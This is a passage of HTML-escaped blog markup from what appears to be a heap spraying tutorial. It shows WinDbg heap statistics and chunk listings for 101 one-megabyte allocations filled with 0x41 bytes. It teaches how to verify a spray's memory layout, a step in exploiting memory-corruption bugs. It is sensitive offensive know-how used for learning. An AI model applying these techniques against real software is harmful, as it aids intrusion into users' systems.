justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;VirtAllocBlocks&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;00000000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;VirtAlloc bytes 00000000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;_HEAP 02e20000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Segments&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;00000001&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Reserved&lt;span&gt;&amp;nbsp; &lt;/span&gt;bytes 00040000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Committed bytes 00001000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;VirtAllocBlocks&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;00000000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;VirtAlloc bytes 00000000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;_HEAP 00010000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Segments&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;00000001&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Reserved&lt;span&gt;&amp;nbsp; &lt;/span&gt;bytes 00010000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;Committed bytes 00001000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;VirtAllocBlocks&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;00000000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;VirtAlloc bytes 00000000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;Look at the “VirtAlloc bytes” field for a heap with a large allocation. The heap address we’re interested in is the first one – “_HEAP 00360000”&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;Next, view the allocation statistics for that heap handle:&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;!heap -stat -h 00360000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;heap @ 00360000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;group-by: TOTSIZE max-display: 20&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;size&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;#blocks&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;total&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;( %) (percent of total busy bytes)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 65 - 64ff360&lt;span&gt;&amp;nbsp; &lt;/span&gt;(99.12)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;40010 1 - 40010&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.25)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;1034 10 - 10340&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.06)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;20 356 - 6ac0&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.03)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;494 16 - 64b8&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.02)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;5ba0 1 - 5ba0&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.02)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;5e4 b - 40cc&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.02)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;4010 1 - 4010&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.02)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;3980 1 - 3980&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.01)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;d0 3e - 3260&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.01)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;460 b - 3020&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.01)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;1800 2 - 3000&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.01)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;800 6 - 3000&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.01)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;468 a - 2c10&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.01)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;2890 1 - 2890&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.01)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;78 52 - 2670&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.01)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;10 215 - 2150&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.01)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;1080 2 - 2100&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.01)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;2b0 c - 2040&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.01)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;2010 1 - 2010&lt;span&gt;&amp;nbsp; &lt;/span&gt;(0.01)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="font-family: inherit; text-align: justify;"&gt;&lt;span style="font-size: small;"&gt;&lt;span&gt;Our neat and tidy allocations really stand out here. There are exactly 0x65 (101 decimal) allocations of size 0xfffe0 (1 MB minus the 20 byte heap header).&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;span style="font-family: inherit; font-size: small;"&gt;  &lt;/span&gt;&lt;div class="MsoNoSpacing" style="font-family: inherit; text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;span style="font-family: inherit; font-size: small;"&gt;  &lt;/span&gt;&lt;div class="MsoNoSpacing" style="font-family: inherit; text-align: justify;"&gt;&lt;span style="font-size: small;"&gt;&lt;span&gt;A nice feature of WinDbg is that you can view heap chunks of a particular size. The following command lists all the heaps chunks of size 0xfffe0.&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;!heap -flt s fffe0&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;_HEAP @ 360000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;HEAP_ENTRY Size Prev Flags&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;UserPtr UserSize - state&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;037f0018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;037f0020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;038f0018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;038f0020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;039f0018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;039f0020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;03af0018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;03af0020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;03bf0018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;03bf0020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;05e80018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;05e80020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;05f80018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;05f80020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;06080018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;06080020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;06180018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;06180020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;…&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0aa80018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0aa80020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0ab80018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0ab80020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0ac80018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0ac80020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0ad80018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0ad80020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0ae80018 1fffc fffc &lt;span&gt;&amp;nbsp;&lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0ae80020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0af80018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0af80020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0b080018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0b080020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0b180018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0b180020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0b280018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0b280020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0b380018 1fffc fffc&lt;span&gt;&amp;nbsp; &lt;/span&gt;[00]&lt;span&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;0b380020&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;fffe0 - (busy VirtualAlloc)&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;_HEAP @ 10000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;_HEAP @ 270000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;_HEAP @ 750000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;_HEAP @ 2e20000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;_HEAP @ 35b0000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;Note how each allocation is allocated in sequential order.&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;Now that we have the addresses of each heap chunk we can start to inspect memory for our 0x41’s:&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;0:007&amp;gt; db 06b80000&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;06b80000&lt;span&gt;&amp;nbsp; &lt;/span&gt;00 00 c8 06 00 00 a8 06-00 00 00 00 00 00 00 00&lt;span&gt;&amp;nbsp; &lt;/span&gt;................&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;06b80010&lt;span&gt;&amp;nbsp; &lt;/span&gt;00 00 10 00 00 00 10 00-61 65 15 29 00 00 00 04&lt;span&gt;&amp;nbsp; &lt;/span&gt;........ae.)....&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;06b80020&lt;span&gt;&amp;nbsp; &lt;/span&gt;da ff 0f 00 41 41 41 41-41 41 41 41 41 41 41 41&lt;span&gt;&amp;nbsp; &lt;/span&gt;....AAAAAAAAAAAA&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;06b80030&lt;span&gt;&amp;nbsp; &lt;/span&gt;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41&lt;span&gt;&amp;nbsp; &lt;/span&gt;AAAAAAAAAAAAAAAA&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;06b80040&lt;span&gt;&amp;nbsp; &lt;/span&gt;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41&lt;span&gt;&amp;nbsp; &lt;/span&gt;AAAAAAAAAAAAAAAA&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;06b80050&lt;span&gt;&amp;nbsp; &lt;/span&gt;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41&lt;span&gt;&amp;nbsp; &lt;/span&gt;AAAAAAAAAAAAAAAA&lt;/span&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;span&gt;06b80060&lt;span&gt;&amp;nbsp; &lt;/span&gt;41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41&lt;span&gt;&amp;nbsp; 